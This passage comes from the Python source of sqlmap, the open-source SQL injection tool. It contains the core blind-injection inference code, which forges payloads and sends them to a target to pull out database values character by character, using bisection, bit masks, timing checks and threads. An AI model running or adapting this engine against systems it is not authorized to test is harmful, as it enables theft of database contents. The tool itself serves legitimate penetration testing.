kb.originalTimeDelay\n                                        return decodeIntToUnicode(retVal)\n                                else:\n                                    if timeBasedCompare:\n                                        threadData.validationRun += 1\n                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and threadData.validationRun > VALID_TIME_CHARS_RUN_THRESHOLD:\n                                            dbgMsg = \"turning back on time auto-adjustment mechanism\"\n                                            logger.debug(dbgMsg)\n                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES\n\n                                    return decodeIntToUnicode(retVal)\n                            else:\n                                return None\n            else:\n                if \"'%s'\" % CHAR_INFERENCE_MARK in payload and conf.charset:\n                    errMsg = \"option '--charset' is not supported on '%s'\" % Backend.getIdentifiedDbms()\n                    raise SqlmapUnsupportedFeatureException(errMsg)\n\n                candidates = list(originalTbl)\n                bit = 0\n                while len(candidates) > 1:\n                    bits = {}\n                    for candidate in candidates:\n                        bit = 0\n                        while candidate:\n                            bits.setdefault(bit, 0)\n                            bits[bit] += 1 if candidate & 1 else -1\n                            candidate >>= 1\n                            bit += 1\n\n                    choice = sorted(bits.items(), key=lambda _: abs(_[1]))[0][0]\n                    mask = 1 << choice\n\n                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, \"&%d%s\" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))\n                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n                    incrementCounter(getTechnique())\n\n                    if result:\n                        candidates = [_ for _ in candidates if _ & mask > 0]\n                    else:\n                        candidates = [_ for _ in candidates if _ & mask == 0]\n\n                    bit += 1\n\n                if candidates:\n                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))\n                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)\n                    incrementCounter(getTechnique())\n\n                    if result:\n                        return decodeIntToUnicode(candidates[0])\n\n        # Go multi-threading (--threads > 1)\n        if numThreads > 1 and isinstance(length, int) and length > 1:\n            threadData.shared.value = [None] * length\n            threadData.shared.index = [firstChar]    # As list for python nested function scoping\n            threadData.shared.start = firstChar\n\n            try:\n                def blindThread():\n                    threadData = getCurrentThreadData()\n\n                    while kb.threadContinue:\n                        with kb.locks.index:\n                            if threadData.shared.index[0] - firstChar >= length:\n                                return\n\n                            threadData.shared.index[0] += 1\n                            currentCharIndex = threadData.shared.index[0]\n\n                        if kb.threadContinue:\n                            val = getChar(currentCharIndex, asciiTbl, not(charsetType is None and conf.charset))\n                            if val is None:\n                                val = INFERENCE_UNKNOWN_CHAR\n                        else:\n                            break\n\n                        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4629\n                        if not isListLike(threadData.shared.value):\n                            break\n\n                        with kb.locks.value:\n                            threadData.shared.value[currentCharIndex - 1 - firstChar] = val\n                            currentValue = list(threadData.shared.value)\n\n                        if kb.threadContinue:\n                            if showEta:\n                                progress.progress(threadData.shared.index[0])\n                            elif conf.verbose >= 1:\n                                startCharIndex = 0\n                                endCharIndex = 0\n\n                                for i in xrange(length):\n                                    if currentValue[i] is not None:\n                                        endCharIndex = max(endCharIndex, i)\n\n                                output = ''\n\n                                if endCharIndex > conf.progressWidth:\n                                    startCharIndex = endCharIndex - conf.progressWidth\n\n                                count = threadData.shared.start\n\n                                for i in xrange(startCharIndex, endCharIndex + 1):\n                                    output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')\n\n                                for i in xrange(length):\n                                    count += 1 if currentValue[i] is not None else 0\n\n                                if startCharIndex > 0:\n                                    output = \"..\" + output[2:]\n\n                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):\n                                    output = output[:-2] + \"..\"\n\n                                if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):\n                                    _ = count - firstChar\n                                    output += '_' * (min(length, conf.progressWidth) - len(output))\n                                    status = ' %d/%d (%d%%)' % (_, length, int(100.0 * _ / length))\n                                    output += status if _ != length else \" \" * len(status)\n\n                                    dataToStdout(\"\\r[%s] [INFO] retrieved: %s\" % (time.strftime(\"%X\"), output))\n\n                runThreads(numThreads, blindThread, startThreadMsg=False)\n\n            except KeyboardInterrupt:\n                abortedFlag = True\n\n            finally:\n                value = [_ for _ in partialValue]\n                value.extend(_ for _ in threadData.shared.value)\n\n            infoMsg = None\n\n            # If we have got one single character not correctly fetched it\n            # can mean that the connection to the target URL was lost\n            if None in value:\n                partialValue = \"\".join(value[:value.index(None)])\n\n                if partialValue:\n                    infoMsg = \"\\r[%s] [INFO] partially retrieved: %s\" % (time.strftime(\"%X\"), filterControlChars(partialValue))\n            else:\n                finalValue = \"\".join(value)\n                infoMsg = \"\\r[%s] [INFO] retrieved: %s\" % (time.strftime(\"%X\"), filterControlChars(finalValue))\n\n            if conf.verbose in (1, 2) and infoMsg and not any((showEta, conf.api, kb.bruteMode)):\n                dataToStdout(infoMsg)\n\n        # No multi-threading (--threads = 1)\n        else:\n            index = firstChar\n            threadData.shared.value = \"\"\n\n            while True:\n                index += 1\n\n                # Common prediction feature (a.k.a. \"good samaritan\")\n                # NOTE: to be used only when multi-threading is not set for\n                # the moment\n                if conf.predictOutput and len(partialValue) > 0 and kb.partRun is not None:\n                    val = None\n                    commonValue, commonPattern, commonCharset, otherCharset = goGoodSamaritan(partialValue, asciiTbl)\n\n                    # If there is one single output in common-outputs, check\n                    # it via equal against the query output\n                    if commonValue is not None:\n                        # One-shot query containing equals commonValue\n                        testValue = unescaper.escape(\"'%s'\" % commonValue) if \"'\" not in commonValue else unescaper.escape(\"%s\" % commonValue, quote=False)\n\n                        query = getTechniqueData().vector\n                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, \"(%s)%s%s\" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))\n                        query = agent.suffixQuery(query)\n\n                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)\n                        incrementCounter(getTechnique())\n\n                        # Did we have luck?\n                        if result:\n                            if showEta:\n                                progress.progress(len(commonValue))\n                            elif conf.verbose in (1, 2) or conf.api:\n                                dataToStdout(filterControlChars(commonValue[index - 1:]))\n\n                            finalValue = commonValue\n                            break\n\n                    # If there is a common pattern starting with partialValue,\n                    # check it via equal against the substring-query output\n                    if commonPattern is not None:\n                        # Substring-query containing equals commonPattern\n                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))\n                        testValue = unescaper.escape(\"'%s'\" % commonPattern) if \"'\" not in commonPattern else unescaper.escape(\"%s\" % commonPattern, quote=False)\n\n                        query = getTechniqueData().vector\n                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, \"(%s)=%s\" % (subquery, testValue)))\n                        query = agent.suffixQuery(query)\n\n                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)\n                        incrementCounter(getTechnique())\n\n                        # Did we have luck?\n                        if result:\n                            val = commonPattern[index - 1:]\n                            index += len(val) - 1\n\n                    # Otherwise if there is no commonValue (single match from\n                    # txt/common-outputs.txt) and no commonPattern\n                    # (common pattern) use the returned common charset only\n                    # to retrieve the query output\n                    if not val and commonCharset:\n                        val = getChar(index, commonCharset, False)\n\n                    # If we had no luck with commonValue and common charset,\n                    # use the returned other charset\n                    if not val:\n                        val = getChar(index, otherCharset, otherCharset == asciiTbl)\n                else:\n                    val = getChar(index, asciiTbl, not(charsetType is None and conf.charset))\n\n                if val is None:\n                    finalValue = partialValue\n                    break\n\n                if kb.data.processChar:\n                    val = kb.data.processChar(val)\n\n                threadData.shared.value = partialValue = partialValue + val\n\n                if showEta:\n                    progress.progress(index)\n                elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:\n                    dataToStdout(filterControlChars(val))\n\n                # Note: some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces\n                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB, DBMS.DERBY, DBMS.FRONTBASE) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():\n                    finalValue = partialValue[:-INFERENCE_BLANK_BREAK]\n                    break\n                elif charsetType and partialValue[-1:].isspace():\n                    finalValue = partialValue[:-1]\n                    break\n\n                if (lastChar > 0 and index >= lastChar):\n                    finalValue = \"\" if length == 0 else partialValue\n                    finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue\n                    partialValue = None\n                    break\n\n    except KeyboardInterrupt:\n        abortedFlag = True\n    finally:\n        kb.prependFlag = False\n        retrievedLength = len(finalValue or \"\")\n\n        if finalValue is not None:\n            finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue\n            hashDBWrite(expression, finalValue)\n        elif partialValue:\n            hashDBWrite(expression, \"%s%s\" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))\n\n    if conf.hexConvert and not any((abortedFlag, conf.api, kb.bruteMode)):\n        infoMsg = \"\\r[%s] [INFO] retrieved: %s  %s\\n\" % (time.strftime(\"%X\"), filterControlChars(finalValue), \" \" * retrievedLength)\n        dataToStdout(infoMsg)\n    else:\n        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):\n            dataToStdout(\"\\n\")\n\n        if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:\n            infoMsg = \"retrieved: %s\" % filterControlChars(finalValue)\n            logger.info(infoMsg)\n\n    if kb.threadException:\n        raise SqlmapThreadException(\"something unexpected happened inside the threads\")\n\n    if abortedFlag:\n        raise KeyboardInterrupt\n\n    _ = finalValue or partialValue\n\n    return getCounter(getTechnique()), safecharencode(_) if kb.safeCharEncode else _\n\ndef queryOutputLength(expression, payload):\n    \"\"\"\n    Returns the query output length.\n    \"\"\"\n\n    infoMsg = \"retrieving the length of query output\"\n    logger.info(infoMsg)\n\n    start = time.time()\n\n    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)\n    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)\n\n    debugMsg = \"performed %d quer%s in %.2f seconds\" % (count, 'y' if count == 1 else \"ies\", calculateDeltaSeconds(start))\n    logger.debug(debugMsg)\n\n    if isinstance(length, six.string_types) and length.isspace():\n        length = 0\n\n    return length\n"}